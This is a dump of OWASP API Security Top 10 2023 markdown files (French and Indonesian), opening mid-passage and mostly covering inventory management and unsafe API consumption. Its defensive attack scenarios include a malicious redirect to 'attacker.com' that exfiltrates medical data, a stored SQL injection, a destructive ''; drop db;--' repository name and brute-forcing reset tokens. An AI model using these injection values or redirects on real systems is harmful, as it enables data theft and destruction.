vulnérabilités. Les API obsolètes ou non corrigées sont des cibles faciles pour les attaquants.\n\nFaire fonctionner plusieurs versions d'une API nécessite des ressources de gestion supplémentaires de la part du fournisseur de l'API et augmente la surface d'attaque.\n\nUne API a un \"<ins>angle mort de la documentation</ins>\" si :\n\n* Le but de l'hôte de l'API n'est pas clair, et il n'y a pas de réponses explicites aux questions suivantes\n    * Dans quel environnement l'API fonctionne-t-elle (par exemple, production, staging, test, développement) ?\n    * Qui devrait avoir accès au réseau de l'API (par exemple, public, interne, partenaires) ?\n    * Quelle version de l'API est en cours d'exécution ?\n* Il n'y a pas de documentation ou la documentation existante n'est pas mise à jour.\n* Il n'y a pas de plan de retraite pour chaque version de l'API.\n* L'inventaire de l'hôte est manquant ou obsolète.\n\nLa visibilité et l'inventaire des flux de données sensibles jouent un rôle important dans le cadre d'un plan de réponse aux incidents, au cas où une violation se produirait du côté du tiers.\n\nUne API a un \"<ins>angle mort du flux de données</ins>\" si :\n\n* Il y a un \"flux de données sensible\" où l'API partage des données sensibles avec un tiers et\n    * Il n'y a pas de justification commerciale ou d'approbation du flux\n    * Il n'y a pas d'inventaire ou de visibilité du flux\n    * Il n'y a pas de visibilité approfondie sur le type de données sensibles partagées\n\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUn réseau social a mis en place un mécanisme de limitation du taux qui bloque les attaquants qui utilisent la force brute pour deviner les jetons de réinitialisation de mot de passe. Ce mécanisme n'a pas été mis en place dans le code de l'API lui-même, mais dans un composant séparé entre le client et l'API officielle (`api.socialnetwork.owasp.org`). Un chercheur a trouvé un hôte API bêta (`beta.api.socialnetwork.owasp.org`) qui exécute la même API, y compris le mécanisme de réinitialisation du mot de passe, mais le mécanisme de limitation du taux n'était pas en place. Le chercheur a pu réinitialiser le mot de passe de n'importe quel utilisateur en utilisant une simple force brute pour deviner le jeton à 6 chiffres.\n\n### Scénario #2\n\nUn réseau social permet aux développeurs d'applications indépendantes d'intégrer leurs applications avec lui. Dans le cadre de ce processus, un consentement est demandé à l'utilisateur final, afin que le réseau social puisse partager les informations personnelles de l'utilisateur avec l'application indépendante.\n\nLe flux de données entre le réseau social et les applications indépendantes n'est pas suffisamment restrictif ou surveillé, permettant aux applications indépendantes d'accéder non seulement aux informations de l'utilisateur, mais aussi aux informations privées de tous leurs amis.\n\nUne société de conseil crée une application malveillante et parvient à obtenir le consentement de 270 000 utilisateurs. En raison de la faille, la société de conseil parvient à accéder aux informations privées de 50 000 000 d'utilisateurs. Plus tard, la société de conseil vend les informations à des fins malveillantes.\n\n## Comment s'en prémunir ?\n\n* Inventoriez tous les <ins>hôtes API</ins> et documentez les aspects importants de chacun d'eux, en mettant l'accent sur l'environnement de l'API (par exemple, production, staging, test, développement), qui devrait avoir accès, en réseau, à l'hôte (par exemple, public, interne, partenaires) et la version d'API.\n* Inventoriez les <ins>services intégrés</ins> et documentez les aspects importants tels que leur rôle dans le système, les données échangées (flux de données) et leur sensibilité.\n* Documentez tous les aspects de votre API tels que l'authentification, les erreurs, les redirections, la limitation du taux, la politique de partage des ressources entre origines (CORS) et les points d'accès, y compris leurs paramètres, requêtes et réponses.\n* Générez automatiquement la documentation en adoptant des normes ouvertes. Incluez la génération de documentation dans votre pipeline CI/CD.\n* Rendez la documentation de l'API disponible uniquement aux personnes autorisées à utiliser l'API.\n* Utilisez des mesures de protection externes telles que des solutions de sécurité spécifiques aux APIs pour toutes les versions exposées de vos API, pas seulement pour la version de production.\n* Évitez d'utiliser des données de production avec des déploiements d'API hors production. Si cela est inévitable, ces points d'accès doivent bénéficier du même traitement de sécurité que les points d'accès de production.\n* Lorsque les nouvelles versions des API incluent des améliorations de sécurité, effectuez une analyse des risques pour informer des actions de mitigation requises pour les anciennes versions. Par exemple, s'il est possible de rétroporter les améliorations sans casser la compatibilité de l'API plus ancienne ou si vous devez retirer rapidement l'ancienne version et forcer tous les clients à passer à la dernière version.\n\n\n## Références\n\n### Externes\n\n* [CWE-1059: Incomplete Documentation][1]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n", "timestamp": "2025-10-24T22:26:56.685381"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xaa-unsafe-consumption-of-apis.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xaa-unsafe-consumption-of-apis.md", "content": "# API10:2023 Unsafe Consumption of APIs\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Moyenne** | Technique **Grave** : Spécifique à l'organisation |\n| Exploiter ce problème nécessite que les attaquants identifient et compromettent potentiellement d'autres APIs/services avec lesquels l'API cible est intégrée. Habituellement, ces informations ne sont pas publiquement disponibles ou l'API/service intégré n'est pas facilement exploitable. | Les développeurs ont tendance à faire confiance et ne pas vérifier les points d'accès qui interagissent avec des API/services externes ou tiers, en se basant sur des exigences de sécurité plus faibles telles que celles concernant la sécurité du transport, l'authentification/l'autorisation et la validation des entrées. Les attaquants doivent identifier les services avec lesquels l'API cible s'intègre (sources de données) et, éventuellement, les compromettre. | L'impact varie en fonction de ce que l'API cible fait avec les données extraites. L'exploitation réussie peut entraîner une exposition d'informations sensibles à des acteurs non autorisés, de nombreux types d'injections, ou un déni de service. |\n\n## L'API est-elle vulnérable ?\n\nLes développeurs ont tendance à faire confiance aux données reçues des API tierces plus qu'aux entrées utilisateur. Cela est particulièrement vrai pour les API proposées par des entreprises bien connues. En raison de cela, les développeurs ont tendance à adopter des normes de sécurité plus faibles, par exemple en ce qui concerne la validation des entrées et l'analyse en vu de caractères autorisés ou non en entrée (effacés ou échappés).\n\nL'API peut être vulnérable si :\n* Elle interagit avec d'autres API sur un canal non chiffré ;\n* Elle ne valide/filtre pas correctement les données collectées auprès d'autres API avant de les traiter ou de les transmettre à des composants en aval ;\n* Elle suit aveuglément les redirections ;\n* Elle ne limite pas le nombre de ressources disponibles pour traiter les réponses des services tiers ;\n* Elle n'implémente pas de délais d'attente pour les interactions avec les services tiers.\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUne API repose sur un service tiers pour enrichir les adresses commerciales fournies par les utilisateurs. Lorsqu'une adresse est fournie à l'API par l'utilisateur final, elle est envoyée au service tiers et les données renvoyées sont ensuite stockées dans une base de données locale compatible SQL.\n\nLes attaquants utilisent le service tiers pour stocker une payload SQLi associée à une entreprise créée par eux. Ensuite, ils ciblent l'API vulnérable en fournissant une entrée spécifique qui la pousse à extraire leur \"entreprise malveillante\" du service tiers. La charge utile SQLi est alors exécutée par la base de données, exfiltrant des données vers un serveur contrôlé par un attaquant.\n\n### Scénario #2\n\nUne API s'intègre à un fournisseur de services tiers pour stocker en toute sécurité des informations médicales sensibles sur les utilisateurs. Les données sont envoyées via une connexion sécurisée en utilisant une requête HTTP comme celle ci-dessous :\n\n```\nPOST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n```\n\nDes acteurs malveillants ont trouvé un moyen de compromettre l'API tierce et elle commence à répondre avec une redirection permanente `308` aux requêtes comme la précédente.\n\n```\nHTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n```\n\nPuisque l'API suit aveuglément les redirections, elle répète la même requête, y compris les données sensibles de l'utilisateur, vers le serveur de l'attaquant.\n\n### Scénario #3\n\nUn attaquant peut préparer un dépôt git nommé `'; drop db;--`.\n\nMaintenant, lorsqu'une intégration d'une application attaquée est effectuée avec le dépôt malveillant, une charge utile d'injection SQL est utilisée sur une application qui construit une requête SQL en croyant que le nom du dépôt est une entrée sûre.\n\n## Comment s'en prémunir ?\n\n* Lors de l'évaluation des fournisseurs de services, évaluez leur posture de sécurité API.\n* Assurez-vous que toutes les interactions API se font sur un canal de communication sécurisé (TLS).\n* Validez toujours et épurez correctement les données reçues des API intégrées avant de les utiliser.\n* Maintenez une liste blanche des emplacements bien connus vers lesquels les API intégrées peuvent rediriger les vôtres : ne suivez pas aveuglément les redirections.\n\n\n## Références\n\n### OWASP\n\n* [Web Service Security Cheat Sheet][1]\n* [Injection Flaws][2]\n* [Input Validation Cheat Sheet][3]\n* [Injection Prevention Cheat Sheet][4]\n* [Transport Layer Protection Cheat Sheet][5]\n* [Unvalidated Redirects and Forwards Cheat Sheet][6]\n\n### Externes\n\n* [CWE-20: Improper Input Validation][7]\n* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]\n* [CWE-319: Cleartext Transmission of Sensitive Information][9]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\n[2]: https://www.owasp.org/index.php/Injection_Flaws\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/20.html\n[8]: https://cwe.mitre.org/data/definitions/200.html\n[9]: https://cwe.mitre.org/data/definitions/319.html\n", "timestamp": "2025-10-24T22:26:56.806066"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xb0-next-devs.md", "content": "# Perspectives pour les Développeurs\nLa tâche de créer et de maintenir des applications sécurisées, ou de corriger des applications existantes, peut être difficile. Il en va de même pour les API.\n\nNous croyons que l'éducation et la sensibilisation sont des facteurs clés pour écrire des logiciels sécurisés. Tout le reste nécessaire pour atteindre l'objectif dépend de **l'établissement et de l'utilisation de processus de sécurité répétables et de contrôles de sécurité standard**.\n\nOWASP fournit de nombreuses ressources gratuites et ouvertes pour vous aider à aborder la sécurité. Veuillez visiter la [page des Projets OWASP][1] pour une liste complète des projets disponibles.\n\n| | |\n|-|-|\n| **Éducation** | Le [Guide de Sécurité des Applications OWASP][2] devrait vous donner une bonne idée des projets disponibles pour chaque étape/phase du Cycle de Vie du Développement Logiciel (SDLC). Pour une formation pratique, vous pouvez commencer avec [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] ou [OWASP Juice Shop][4] : tous deux ont des APIs intentionnellement vulnérables. Le [Projet de Répertoire d'Applications Web Vulnérables OWASP][5] fournit une liste de projets d'applications intentionnellement vulnérables : vous y trouverez plusieurs autres APIs vulnérables. Vous pouvez également assister à des sessions de formation de la [Conférence OWASP AppSec][6], ou [rejoindre votre chapitre local][7]. |\n| **Exigences de Sécurité** | La sécurité devrait faire partie de chaque projet dès le début. Lors de la définition des exigences, il est important de définir ce que \"sécurisé\" signifie pour ce projet. OWASP vous recommande d'utiliser le [Standard de Vérification de Sécurité des Applications OWASP (ASVS)][8] comme guide pour définir les exigences de sécurité. Si vous externalisez, considérez l'[Annexe de Contrat de Logiciel Sécurisé OWASP][9], qui devrait être adaptée en fonction des lois et réglementations locales. |\n| **Architecture de Sécurité** | La sécurité devrait rester une préoccupation pendant toutes les étapes du projet. La [Série de Cheet Sheat OWASP][10] est un bon point de départ pour obtenir des conseils sur la façon de concevoir la sécurité pendant la phase d'architecture. Parmi beaucoup d'autres, vous trouverez la [Fiche de Triche sur la Sécurité REST][11] et la [Fiche de Triche sur l'Évaluation REST][12] ainsi que la [Fiche de Triche GraphQL][13]. |\n| **Contrôles de Sécurité Standard** | L'adoption de contrôles de sécurité standard réduit le risque d'introduire des faiblesses de sécurité tout en écrivant votre propre logique. Bien que de nombreux frameworks modernes viennent maintenant avec des contrôles standard efficaces intégrés, [OWASP Proactive Controls][14] vous donne un bon aperçu des contrôles de sécurité que vous devriez chercher à inclure dans votre projet. OWASP fournit également certaines bibliothèques et outils que vous pourriez trouver précieux, tels que des contrôles de validation. |\n| **Cycle de Vie de Développement Logiciel Sécurisé** | Vous pouvez utiliser le [Modèle de Maturité de l'Assurance Logicielle OWASP (SAMM)][15] pour améliorer vos processus de construction d'API. Plusieurs autres projets OWASP sont disponibles pour vous aider pendant les différentes phases de développement d'API, par exemple, le [Guide de Révision de Code OWASP][16]. |\n\n[1]: https://owasp.org/projects/\n[2]: https://owasp.org/projects/#owasp-projects-the-sdlc-and-the-security-wayfinder\n[3]: https://owasp.org/www-project-crapi/\n[4]: https://owasp.org/www-project-juice-shop/\n[5]: https://owasp.org/www-project-vulnerable-web-applications-directory/\n[6]: https://owasp.org/events/\n[7]: https://owasp.org/chapters/\n[8]: https://owasp.org/www-project-application-security-verification-standard/\n[9]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[10]: https://cheatsheetseries.owasp.org/\n[11]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\n[12]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html\n[13]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n[14]: https://owasp.org/www-project-proactive-controls/\n[15]: https://owasp.org/www-project-samm/\n[16]: https://owasp.org/www-project-code-review-guide/\n", "timestamp": "2025-10-24T22:26:56.925652"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xb1-next-devsecops.md", "content": "# Perspectives pour les DevSecOps\n\nEn raison de leur importance dans les architectures d'applications modernes, la construction d'API sécurisées est cruciale. La sécurité ne peut être négligée et doit faire partie de tout le cycle de développement. Scanner et réaliser des tests de pénétration une fois par an ne suffit plus.\n\nLes DevSecOps devraient rejoindre l'effort de développement, facilitant les tests de sécurité continus tout au long du cycle de vie du logiciel. Votre objectif devrait être d'améliorer le pipeline de développement avec l'automatisation de la sécurité, sans impacter la vitesse de développement.\n\nEn cas de doute, restez informé et référez-vous au [Manifeste DevSecOps][1].\n\n| | |\n|-|-|\n| **Comprendre le Modèle de Menace** | Les priorités de test proviennent d'un modèle de menace. Si vous n'en avez pas, envisagez d'utiliser le [Standard de Vérification de Sécurité des Applications OWASP (ASVS)][2], et le [Guide de Test de Sécurité OWASP][3] comme entrée. Impliquer l'équipe de développement les rendra plus conscients de la sécurité. |\n| **Comprendre le SDLC** | Rejoignez l'équipe de développement pour mieux comprendre le Cycle de Vie du Développement Logiciel. Votre contribution aux tests de sécurité continus doit être compatible avec les personnes, les processus et les outils. Tout le monde devrait être d'accord avec le processus, pour qu'il n'y ait pas de friction ou de résistance inutile. |\n| **Stratégies de Test** | Puisque votre travail ne doit pas impacter la vitesse de développement, vous devriez choisir judicieusement la meilleure technique (simple, rapide, précise) pour vérifier les exigences de sécurité. Le [Cadre de Connaissance de Sécurité OWASP][4] et le [Standard de Vérification de Sécurité des Applications OWASP][2] peuvent être de grandes sources d'exigences de sécurité fonctionnelles et non fonctionnelles. Il existe d'autres excellentes sources pour des [projets][5] et [outils][6] similaires à ceux proposés par la [communauté DevSecOps][7]. |\n| **Atteindre la Couverture et la Précision** | Vous êtes le pont entre les équipes de développement et d'exploitation. Pour atteindre une couverture, vous devriez non seulement vous concentrer sur la fonctionnalité, mais aussi sur l'orchestration. Travaillez étroitement avec les équipes de développement et d'exploitation dès le début pour optimiser votre temps et vos efforts. Vous devriez viser un état où la sécurité essentielle est vérifiée en continu. |\n| **Communiquer Clairement les Résultats** | Apportez de la valeur avec moins ou pas de friction. Livrez les résultats en temps voulu, dans les outils que les équipes de développement utilisent (pas de fichiers PDF). Rejoignez l'équipe de développement pour traiter les résultats. Profitez de l'occasion pour les former, en décrivant clairement la faiblesse et comment elle peut être exploitée, y compris un scénario d'attaque pour le rendre réel. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: http://devsecops.github.io/\n[6]: https://github.com/devsecops/awesome-devsecops\n[7]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:57.040854"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xd0-about-data.md", "content": "# Méthodologie et données\n\n## Aperçu\n\nPour cette mise à jour de la liste, l'équipe OWASP API Security a utilisé la même méthodologie que celle utilisée pour la liste de 2019, qui a été bien adoptée et couronnée de succès, avec l'ajout d'un [Appel à Données][1] public de 3 mois. Malheureusement, cet appel à données n'a pas donné lieu à des données qui auraient permis une analyse statistique pertinente des problèmes de sécurité des API les plus courants.\n\nCependant, avec une industrie de la sécurité des API plus mature capable de fournir des retours directs et des informations, le processus de mise à jour a avancé en utilisant la même méthodologie qu'auparavant.\n\nArrivés ici, nous pensons disposer d'un document de sensibilisation prospectif pour les trois ou quatre prochaines années, plus axé sur les problèmes spécifiques aux API modernes. L'objectif de ce projet n'est pas de remplacer d'autres listes de TOP 10, mais plutôt de couvrir les risques de sécurité des API existants et à venir sur lesquels nous pensons que l'industrie devrait être consciente et vigilante.\n\n## Méthodologie\n\nDans la première phase, des données publiques sur les incidents de sécurité des API ont été collectées, examinées et catégorisées. Ces données ont été collectées à partir de plateformes de bug bounty et de rapports disponibles publiquement. Seuls les problèmes signalés entre 2019 et 2022 ont été pris en compte. Ces données ont été utilisées pour donner à l'équipe une idée de la direction dans laquelle le TOP 10 devrait évoluer, ainsi que pour aider à traiter un éventuel biais des données contribuées.\n\nUn [Appel à Données][1] public a été lancé du 1er septembre au 30 novembre 2022. En parallèle, l'équipe du projet a commencé à discuter de ce qui a changé depuis 2019. La discussion a porté sur l'impact de la première liste, les retours reçus de la communauté et les nouvelles tendances en matière de sécurité des API.\n\nL'équipe du projet a organisé des réunions avec des spécialistes des menaces de sécurité des API pour obtenir des informations sur la manière dont les victimes sont impactées et sur la manière dont ces menaces peuvent être atténuées.\n\nCet effort a abouti à une première ébauche de ce que l'équipe estime être les dix risques de sécurité des API les plus critiques. La [Méthodologie de Notation des Risques OWASP][2] a été utilisée pour effectuer l'analyse des risques. Les notations de prévalence ont été décidées à partir d'un consensus entre les membres de l'équipe du projet, sur la base de leur expérience dans le domaine. Pour des considérations sur ces questions, veuillez vous référer à la section [Risques de Sécurité des API][3].\n\nLa première ébauche a ensuite été partagée pour examen avec des professionels de la sécurité ayant une expérience dans les domaines de la sécurité des API. Leurs commentaires ont été examinés, discutés et, le cas échéant, inclus dans le document. Le document résultant a été [publié en tant que Candidat à la Publication][4] pour [discussion ouverte][5]. Plusieurs [contributions de la communauté][6] ont été incluses dans le document final.\n\nLa liste des contributeurs est disponible dans la section [Remerciements][7].\n\n## Risques spécifiques aux API\n\nLa liste est construite pour aborder les risques de sécurité qui sont plus spécifiques aux API.\n\nCela n'implique pas que d'autres risques de sécurité génériques d'applications n'existent pas dans les applications basées sur des API. Par exemple, nous n'avons pas inclus des risques tels que \"Composants Vulnérables et Obsolètes\" ou \"Injection\", même si vous pourriez les trouver dans des applications basées sur des API. Ces risques sont génériques, ils ne se comportent pas différemment dans les API, leur exploitation n'est pas différente.\n\nNotre objectif est d'augmenter la sensibilisation aux risques de sécurité qui méritent une attention particulière dans les API.\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[3]: ./0x10-api-security-risks.md\n[4]: https://owasp.org/www-project-api-security/announcements/2023/02/api-top10-2023rc\n[5]: https://github.com/OWASP/API-Security/issues?q=is%3Aissue+label%3A2023RC\n[6]: https://github.com/OWASP/API-Security/pulls?q=is%3Apr+label%3A2023RC\n[7]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:57.149826"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xd1-acknowledgments.md", "content": "# Remerciements\n\n## Remerciements aux Contributeurs\n\nNous aimerions remercier les contributeurs suivants qui ont contribué publiquement sur GitHub, ou via d'autres moyens :\n\n247arjun, abunuwas, Alissa Knight, Arik Atar, Aurélien Troncy, aymenfurter, Corey J. Ball, cyn8,\nd0znpp, Dan Gordon, donge, Dor Tumarkin, faizzaidi, gavjl, guybensimhon, Inês\nMartins, Isabelle Mauny, Ivan Novikov, jmanico, Juan Pablo, k7jto, LaurentCB,\nllegaz, Maxim Zavodchik, MrPRogers, planetlevel, rahulk22, Roey Eliyahu, Roshan\nPiyush, securitylevelup, sudeshgadewar123, Tatsuya-hasegawa, tebbers, vanderaj,\nwenz, xplo1t-sec, Yaniv Balmas, ynvb\n", "timestamp": "2025-10-24T22:26:57.385301"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x00-header.md", "content": "---\ntitle: ''\ndescription: OWASP API Security Top 10 edisi 2023\n---\n\n![OWASP LOGO](images/cover.jpg)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Karya ini dilisensikan di bawah [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n</file-attachment-contents>\n", "timestamp": "2025-10-24T22:26:57.857307"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x00-notice.md", "content": "# Pemberitahuan\n\nIni adalah versi teks dari OWASP API Security Top 10, digunakan sebagai sumber untuk semua versi resmi dokumen ini seperti situs web.\n\nKontribusi terhadap proyek seperti komentar, koreksi, atau terjemahan harus dilakukan di sini. Untuk perincian tentang [Cara Berkontribusi][1], harap mengacu pada [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n* Paulo Silva\n\n[1]: ../../../CONTRIBUTING.md", "timestamp": "2025-10-24T22:26:58.067146"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x00-toc.md", "content": "# Daftar Isi\n\n* [Daftar Isi](0x00-toc.md)  \n* [Tentang OWASP](0x01-about-owasp.md)\n* [Kata Pengantar](0x02-foreword.md)\n* [Pendahuluan](0x03-introduction.md)\n* [Catatan Rilis](0x04-release-notes.md)\n* [Risiko Keamanan API](0x10-api-security-risks.md)\n* [OWASP Top 10 Risiko Keamanan API - 2023](0x11-t10.md)\n* [API1:2023 Kerusakan Otorisasi Tingkat Obyek](0xa1-broken-object-level-authorization.md)\n* [API2:2023 Kerusakan Otentikasi](0xa2-broken-authentication.md)  \n* [API3:2023 Kerusakan Otorisasi Tingkat Properti Obyek](0xa3-broken-object-property-level-authorization.md)\n* [API4:2023 Konsumsi Sumber Daya yang Tidak Dibatasi](0xa4-unrestricted-resource-consumption.md)\n* [API5:2023 Kerusakan Otorisasi Tingkat Fungsi](0xa5-broken-function-level-authorization.md)\n* [API6:2023 Akses Tanpa Batas ke Aliran Bisnis Sensitif](0xa6-unrestricted-access-to-sensitive-business-flows.md) \n* [API7:2023 Pemalsuan Permintaan Sisi Server](0xa7-server-side-request-forgery.md)\n* [API8:2023 Kesalahan Konfigurasi Keamanan](0xa8-security-misconfiguration.md)\n* [API9:2023 Manajemen Inventaris yang Tidak Tepat](0xa9-improper-inventory-management.md)\n* [API10:2023 Konsumsi API yang Tidak Aman](0xaa-unsafe-consumption-of-apis.md)\n* [Apa Selanjutnya untuk Pengembang](0xb0-next-devs.md)\n* [Apa Selanjutnya untuk DevSecOps](0xb1-next-devsecops.md)  \n* [Metodologi dan Data](0xd0-about-data.md)\n* [Ucapan Terima Kasih](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:58.178052"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x01-about-owasp.md", "content": "# Tentang OWASP\n\nOpen Worldwide Application Security Project (OWASP) adalah komunitas terbuka yang didedikasikan untuk memungkinkan organisasi mengembangkan, membeli, dan memelihara aplikasi dan API yang dapat dipercaya.\n\nDi OWASP, Anda akan menemukan gratis dan terbuka:\n\n* Alat dan standar keamanan aplikasi. \n* Buku lengkap tentang pengujian keamanan aplikasi, pengembangan kode yang aman, dan tinjauan kode yang aman.\n* Presentasi dan [video][1].\n* [Cheat sheet][2] berbagai topik umum.\n* Kendali dan pustaka keamanan standar.\n* [Chapter lokal di seluruh dunia][3]. \n* Penelitian mutakhir.\n* [Beragam konferensi di seluruh dunia][4].\n* [Mailing list][5] ([arsip][6]).\n\nPelajari lebih lanjut di: [https://www.owasp.org][7].\n\nSemua alat, dokumen, video, presentasi, dan chapter OWASP gratis dan terbuka bagi siapa pun yang tertarik dalam meningkatkan keamanan aplikasi.\n\nKami menganjurkan melihat keamanan aplikasi sebagai masalah orang, proses, dan teknologi, karena pendekatan paling efektif terhadap keamanan aplikasi membutuhkan peningkatan di area ini.\n\nOWASP adalah organisasi jenis baru. Kebebasan kami dari tekanan komersial memungkinkan kami untuk memberikan informasi praktis, tidak bias, dan hemat biaya tentang keamanan aplikasi. \n\nOWASP tidak berafiliasi dengan perusahaan teknologi mana pun, meskipun kami mendukung penggunaan teknologi keamanan komersial yang terinformasi. OWASP memproduksi banyak jenis materi dengan cara kolaboratif, transparan, dan terbuka. \n\nYayasan OWASP adalah entitas nirlaba yang memastikan keberhasilan jangka panjang proyek. Hampir semua orang yang terkait dengan OWASP adalah relawan, termasuk dewan OWASP, pemimpin chapter, pemimpin proyek, dan anggota proyek. Kami mendukung penelitian keamanan inovatif dengan hibah dan infrastruktur.\n\nBergabunglah dengan kami!\n\n## Hak Cipta dan Lisensi\n\n![license](images/license.png) \n\nHak Cipta © 2003-2023 Yayasan OWASP. Dokumen ini dirilis di bawah [Creative Commons Attribution Share-Alike 4.0 license][8]. Untuk setiap penggunaan kembali atau distribusi, Anda harus menjelaskan kepada orang lain ketentuan lisensi karya ini. \n\n[1]: https://www.youtube.com/user/OWASPGLOBAL \n[2]: https://cheatsheetseries.owasp.org/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://groups.google.com/a/owasp.org/forum/#!overview\n[6]: https://lists.owasp.org/mailman/listinfo\n[7]: https://www.owasp.org\n[8]: http://creativecommons.org/licenses/by-sa/4.0/", "timestamp": "2025-10-24T22:26:58.383451"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x02-foreword.md", "content": "# Kata Pengantar \n\nElemen inovasi dasar di dunia yang digerakkan aplikasi  hari ini adalah Application Programming Interface (API). Dari bank, ritel, dan transportasi hingga IoT, kendaraan otonom, dan kota pintar, API merupakan bagian penting dari aplikasi seluler, SaaS, dan web aplikasi dan dapat ditemukan dalam aplikasi untuk pelanggan, mitra, dan internal.\n\nBerdasarkan sifatnya, API mengekspos logika aplikasi dan data sensitif seperti Informasi Pribadi yang Dapat Diidentifikasi (PII) dan karena ini, API semakin menjadi target para penyerang. Tanpa API yang aman, inovasi cepat akan menjadi mustahil. \n\nMeskipun masih dapat menggunakan Top 10 risiko keamanan aplikasi web yang lebih luas, namun karena sifat khususnya, dibutuhkan daftar risiko keamanan API yang spesifik. Keamanan API berfokus pada strategi dan solusi untuk memahami dan memitigasi kerentanan unik dan risiko keamanan yang terkait dengan API.\n\nJika Anda sudah akrab dengan [Proyek OWASP Top 10][1], maka Anda akan melihat kesamaan di antara kedua dokumen: mereka ditujukan agar mudah dibaca dan diadopsi. Jika anda baru mengenal seri OWASP Top 10, anda mungkin lebih baik membaca bagian [Risiko Keamanan API][2] dan [Metodologi dan Data][3] sebelum melompat ke daftar Top 10.\n\nAnda dapat berkontribusi pada OWASP API Security Top 10 dengan pertanyaan, komentar, dan ide Anda di repositori proyek GitHub kami:\n\n* https://owasp.org/www-project-api-security/ \n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nAnda dapat menemukan OWASP API Security Top 10 di sini:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security  \n\nKami ingin berterima kasih kepada semua kontributor yang membuat proyek ini terwujud dengan upaya dan kontribusi mereka. Mereka semua tercantum di bagian [Ucapan Terima Kasih][4]. Terima kasih!\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md \n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:58.590940"}
